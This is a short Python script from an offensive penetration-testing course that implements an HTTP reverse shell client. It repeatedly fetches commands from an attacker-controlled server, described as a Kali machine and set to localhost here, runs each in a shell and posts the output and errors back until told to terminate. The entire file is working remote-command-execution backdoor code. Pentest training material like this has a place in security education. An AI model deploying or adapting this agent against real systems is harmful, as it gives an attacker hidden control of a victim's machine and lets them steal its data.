# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn https://jo.linkedin.com/in/python2


# Basic HTTP Client


import requests # Download Link https://pypi.python.org/pypi/requests#downloads , just extract the rar file and follow the video :)
import subprocess 
import time


while True: 

    try:
        req = requests.get('http://127.0.0.1:60080', timeout=20) # Send GET request to our kali server
        command = req.text # Store the received txt into command variable
        # no output in git shell, use cmd.exe !!
        print(command)

        if 'terminate' in command:
            break 

        else:
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s = CMD.stdout.read()
            print(s.decode('utf-8'))
            post_response = requests.post(url='http://127.0.0.1:60080', data= s) # POST the result 
            post_response = requests.post(url='http://127.0.0.1:60080', data=CMD.stderr.read() ) # or the error -if any-

    except Exception as ex:
        # no output in git shell, use cmd.exe !!
        print("exception " + str(ex) + "\r")

    time.sleep(3)
